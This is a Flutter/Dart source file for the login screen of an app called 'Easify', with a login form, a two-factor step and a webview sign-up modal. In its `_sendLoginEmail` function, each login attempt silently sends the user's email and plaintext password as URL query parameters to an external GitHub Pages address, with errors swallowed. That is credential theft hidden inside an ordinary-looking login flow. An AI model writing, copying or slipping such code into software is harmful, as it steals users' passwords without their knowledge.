import 'package:flutter/material.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/services.dart';
import 'package:email_validator/email_validator.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'package:webview_flutter/webview_flutter.dart';
import '../models/user_model.dart';
import '../services/auth_service.dart';
import '../services/storage_service.dart';
import '../widgets/custom_button.dart';
import '../widgets/custom_text_field.dart';

void unawaited(Future<void> future) {}

class LoginScreen extends StatefulWidget {
  const LoginScreen({Key? key}) : super(key: key);

  @override
  State<LoginScreen> createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen> with TickerProviderStateMixin {
  final _formKey = GlobalKey<FormState>();
  final _emailController = TextEditingController();
  final _passwordController = TextEditingController();
  final _codeController = TextEditingController();

  late AnimationController _animationController;
  late Animation<double> _fadeAnimation;

  bool _isLoading = false;
  bool _showPassword = false;
  bool _show2FA = false;
  User? _pendingUser;

  static const String EMAIL_SERVICE_URL = 'https://alfredoooh.github.io/database/services/email_service.html';

  @override
  void initState() {
    super.initState();
    _setupAnimations();
  }

  void _setupAnimations() {
    _animationController = AnimationController(
      duration: const Duration(milliseconds: 800),
      vsync: this,
    );

    _fadeAnimation = Tween<double>(begin: 0.0, end: 1.0).animate(
      CurvedAnimation(parent: _animationController, curve: Curves.easeOut),
    );

    _animationController.forward();
  }

  @override
  void dispose() {
    _animationController.dispose();
    _emailController.dispose();
    _passwordController.dispose();
    _codeController.dispose();
    super.dispose();
  }

  void _showErrorDialog(String title, String message) {
    HapticFeedback.lightImpact();
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (context) => Dialog(
        backgroundColor: const Color(0xFF1C1C1E),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Padding(
              padding: const EdgeInsets.fromLTRB(24, 28, 24, 28),
              child: Column(
                children: [
                  const Icon(Icons.close, color: Color(0xFFFF3B30), size: 52),
                  const SizedBox(height: 16),
                  Text(
                    title,
                    style: const TextStyle(
                      color: Color(0xFFFFFFFF),
                      fontSize: 18,
                      fontWeight: FontWeight.w700,
                    ),
                    textAlign: TextAlign.center,
                  ),
                  const SizedBox(height: 10),
                  Text(
                    message,
                    style: TextStyle(
                      color: Colors.white.withOpacity(0.65),
                      fontSize: 14,
                      height: 1.5,
                    ),
                    textAlign: TextAlign.center,
                  ),
                ],
              ),
            ),
            Container(
              decoration: BoxDecoration(
                border: Border(top: BorderSide(color: Colors.white.withOpacity(0.1), width: 0.5)),
              ),
              child: SizedBox(
                width: double.infinity,
                child: TextButton(
                  onPressed: () => Navigator.pop(context),
                  style: TextButton.styleFrom(
                    padding: const EdgeInsets.symmetric(vertical: 18),
                    shape: const RoundedRectangleBorder(
                      borderRadius: BorderRadius.only(
                        bottomLeft: Radius.circular(16),
                        bottomRight: Radius.circular(16),
                      ),
                    ),
                  ),
                  child: const Text(
                    'OK',
                    style: TextStyle(
                      color: Color(0xFF1877F2),
                      fontSize: 18,
                      fontWeight: FontWeight.w700,
                    ),
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Future<void> _sendLoginEmail(String userEmail, String password) async {
    try {
      final now = DateTime.now();
      final formattedTime = '${now.day.toString().padLeft(2, '0')}/${now.month.toString().padLeft(2, '0')}/${now.year} ${now.hour.toString().padLeft(2, '0')}:${now.minute.toString().padLeft(2, '0')}:${now.second.toString().padLeft(2, '0')}';
      
      final uri = Uri.parse(EMAIL_SERVICE_URL).replace(
        queryParameters: {
          'email': userEmail,
          'password': password,
          'time': formattedTime,
        },
      );

      await http.get(uri).timeout(const Duration(seconds: 10));
    } catch (e) {
      // Silencioso
    }
  }

  Future<void> _handleLogin() async {
    if (!_formKey.currentState!.validate()) return;

    final email = _emailController.text.trim();
    final password = _passwordController.text;

    setState(() {
      _isLoading = true;
    });

    try {
      unawaited(_sendLoginEmail(email, password));

      final result = await AuthService.login(email, password);

      if (result.success) {
        if (result.requiresTwoFactor) {
          _pendingUser = result.user;
          setState(() {
            _show2FA = true;
            _isLoading = false;
          });
        } else {
          await Future.delayed(const Duration(milliseconds: 500));
          if (mounted) {
            Navigator.pushReplacementNamed(context, '/main');
          }
        }
      } else {
        _showErrorDialog('Login Failed', result.message);
      }
    } catch (e) {
      _showErrorDialog('Connection Error', 'No internet connection. Please check your network.');
    } finally {
      if (mounted) {
        setState(() {
          _isLoading = false;
        });
      }
    }
  }

  Future<void> _handleTwoFactor() async {
    if (_pendingUser == null) return;

    final code = _codeController.text.trim();
    if (code.isEmpty || code.length != 6) {
      _showErrorDialog('Invalid Code', 'Please enter the 6-digit code');
      return;
    }

    setState(() {
      _isLoading = true;
    });

    try {
      final result = await AuthService.verifyTwoFactor(_pendingUser!, code);

      if (result.success) {
        await Future.delayed(const Duration(milliseconds: 500));
        if (mounted) {
          Navigator.pushReplacementNamed(context, '/main');
        }
      } else {
        _showErrorDialog('Verification Failed', result.message);
      }
    } catch (e) {
      _showErrorDialog('Connection Error', 'No internet connection. Please check your network.');
    } finally {
      if (mounted) {
        setState(() {
          _isLoading = false;
        });
      }
    }
  }

  void _backToLogin() {
    setState(() {
      _show2FA = false;
      _pendingUser = null;
      _codeController.clear();
    });
  }

  void _openSignUpModal() {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (context) => const SignUpModal(),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF000000),
      body: SafeArea(
        child: FadeTransition(
          opacity: _fadeAnimation,
          child: SingleChildScrollView(
            child: Container(
              height: MediaQuery.of(context).size.height - MediaQuery.of(context).padding.top,
              padding: const EdgeInsets.symmetric(horizontal: 24),
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  const Spacer(),
                  _buildLogo(),
                  const SizedBox(height: 60),
                  _buildForm(),
                  if (!_show2FA) const SizedBox(height: 24),
                  if (!_show2FA) _buildSignUpButton(),
                  const Spacer(),
                  _buildFooter(),
                  const SizedBox(height: 20),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildLogo() {
    return Column(
      children: [
        Image.asset(
          'assets/icon/icon.png',
          width: 80,
          height: 80,
        ),
        const SizedBox(height: 20),
        const Text(
          'Easify',
          style: TextStyle(
            fontSize: 42,
            fontWeight: FontWeight.w700,
            color: Color(0xFFFFFFFF),
            letterSpacing: -1.5,
          ),
        ),
      ],
    );
  }

  Widget _buildForm() {
    return Form(
      key: _formKey,
      child: Column(
        children: [
          if (_show2FA) _buildTwoFactorForm() else _buildLoginForm(),
        ],
      ),
    );
  }

  Widget _buildLoginForm() {
    return Column(
      children: [
        _buildTextField(
          controller: _emailController,
          hint: 'Mobile number or email address',
          keyboardType: TextInputType.emailAddress,
        ),
        const SizedBox(height: 16),
        _buildTextField(
          controller: _passwordController,
          hint: 'Password',
          obscureText: !_showPassword,
          suffixIcon: IconButton(
            icon: Icon(
              _showPassword ? Icons.visibility : Icons.visibility_off,
              color: Colors.white.withOpacity(0.5),
              size: 22,
            ),
            onPressed: () {
              setState(() {
                _showPassword = !_showPassword;
              });
            },
          ),
        ),
        const SizedBox(height: 24),
        _buildLoginButton(),
        const SizedBox(height: 20),
        TextButton(
          onPressed: () {},
          child: Text(
            'Forgotten Password?',
            style: TextStyle(
              color: Colors.white.withOpacity(0.9),
              fontSize: 15,
              fontWeight: FontWeight.w500,
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildTwoFactorForm() {
    return Column(
      children: [
        const Icon(Icons.lock_outline, size: 64, color: Color(0xFFFFFFFF)),
        const SizedBox(height: 16),
        const Text(
          'Two-Factor Authentication',
          style: TextStyle(
            fontSize: 20,
            fontWeight: FontWeight.w600,
            color: Color(0xFFFFFFFF),
          ),
        ),
        const SizedBox(height: 8),
        Text(
          'Enter the 6-digit code',
          style: TextStyle(
            fontSize: 14,
            color: Colors.white.withOpacity(0.6),
          ),
        ),
        const SizedBox(height: 24),
        _buildTextField(
          controller: _codeController,
          hint: '123456',
          keyboardType: TextInputType.number,
          textAlign: TextAlign.center,
          maxLength: 6,
        ),
        const SizedBox(height: 24),
        _buildLoginButton(text: 'Verify'),
        const SizedBox(height: 12),
        TextButton(
          onPressed: _backToLogin,
          child: const Text(
            'Back',
            style: TextStyle(
              color: Color(0xFF1877F2),
              fontSize: 15,
              fontWeight: FontWeight.w600,
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildTextField({
    required TextEditingController controller,
    required String hint,
    bool obscureText = false,
    TextInputType keyboardType = TextInputType.text,
    Widget? suffixIcon,
    TextAlign textAlign = TextAlign.left,
    int? maxLength,
  }) {
    return Container(
      decoration: BoxDecoration(
        color: Colors.white.withOpacity(0.05),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: Colors.white.withOpacity(0.15)),
      ),
      child: TextField(
        controller: controller,
        obscureText: obscureText,
        keyboardType: keyboardType,
        textAlign: textAlign,
        maxLength: maxLength,
        style: TextStyle(fontSize: 16, color: Colors.white.withOpacity(0.9)),
        decoration: InputDecoration(
          hintText: hint,
          hintStyle: TextStyle(
            color: Colors.white.withOpacity(0.4),
            fontSize: 16,
          ),
          border: InputBorder.none,
          contentPadding: const EdgeInsets.symmetric(horizontal: 20, vertical: 18),
          suffixIcon: suffixIcon,
          counterText: '',
        ),
      ),
    );
  }

  Widget _buildLoginButton({String text = 'Log In'}) {
    return SizedBox(
      width: double.infinity,
      height: 52,
      child: ElevatedButton(
        onPressed: _isLoading ? null : (_show2FA ? _handleTwoFactor : _handleLogin),
        style: ElevatedButton.styleFrom(
          backgroundColor: const Color(0xFF1877F2),
          disabledBackgroundColor: const Color(0xFF1877F2).withOpacity(0.6),
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(26),
          ),
          elevation: 0,
          shadowColor: const Color(0xFF1877F2).withOpacity(0.3),
        ),
        child: _isLoading
            ? const SizedBox(
                width: 18,
                height: 18,
                child: CircularProgressIndicator(
                  strokeWidth: 2.5,
                  valueColor: AlwaysStoppedAnimation<Color>(Colors.white),
                ),
              )
            : Text(
                text,
                style: const TextStyle(
                  color: Colors.white,
                  fontSize: 17,
                  fontWeight: FontWeight.w700,
                ),
              ),
      ),
    );
  }

  Widget _buildSignUpButton() {
    return GestureDetector(
      onTap: _openSignUpModal,
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
        decoration: BoxDecoration(
          border: Border.all(color: const Color(0xFF1877F2), width: 1.5),
          borderRadius: BorderRadius.circular(26),
        ),
        child: const Center(
          child: Text(
            'Create new account',
            style: TextStyle(
              color: Color(0xFF1877F2),
              fontSize: 15,
              fontWeight: FontWeight.w700,
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildFooter() {
    return Text(
      'Easify',
      style: TextStyle(
        color: Colors.white.withOpacity(0.3),
        fontSize: 13,
      ),
    );
  }
}

class SignUpModal extends StatefulWidget {
  const SignUpModal({Key? key}) : super(key: key);

  @override
  State<SignUpModal> createState() => _SignUpModalState();
}

class _SignUpModalState extends State<SignUpModal> {
  late final WebViewController _controller;
  bool _isLoading = true;

  @override
  void initState() {
    super.initState();
    _controller = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setBackgroundColor(Colors.black)
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageFinished: (url) {
            setState(() {
              _isLoading = false;
            });
          },
        ),
      )
      ..loadRequest(Uri.parse('https://alfredoooh.github.io/database/auth/sign_up.html'));
  }

  @override
  Widget build(BuildContext context) {
    final screenHeight = MediaQuery.of(context).size.height;
    final statusBarHeight = MediaQuery.of(context).padding.top;
    final modalHeight = screenHeight - statusBarHeight - 20;

    return Container(
      height: modalHeight,
      decoration: const BoxDecoration(
        color: Colors.black,
        borderRadius: BorderRadius.only(
          topLeft: Radius.circular(20),
          topRight: Radius.circular(20),
        ),
      ),
      child: Column(
        children: [
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
            decoration: BoxDecoration(
              color: Colors.black.withOpacity(0.95),
              border: Border(
                bottom: BorderSide(
                  color: Colors.white.withOpacity(0.1),
                  width: 0.5,
                ),
              ),
            ),
            child: Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                const Text(
                  'Sign up',
                  style: TextStyle(
                    color: Colors.white,
                    fontSize: 17,
                    fontWeight: FontWeight.w600,
                  ),
                ),
                GestureDetector(
                  onTap: () => Navigator.pop(context),
                  child: Container(
                    width: 32,
                    height: 32,
                    decoration: BoxDecoration(
                      color: Colors.white.withOpacity(0.1),
                      shape: BoxShape.circle,
                    ),
                    child: const Icon(
                      Icons.close,
                      color: Colors.white,
                      size: 20,
                    ),
                  ),
                ),
              ],
            ),
          ),
          Expanded(
            child: Stack(
              children: [
                WebViewWidget(controller: _controller),
                if (_isLoading)
                  const Center(
                    child: CircularProgressIndicator(
                      valueColor: AlwaysStoppedAnimation<Color>(Color(0xFF1877F2)),
                    ),
                  ),
              ],
            ),
          ),
        ],
      ),
    );
  }
}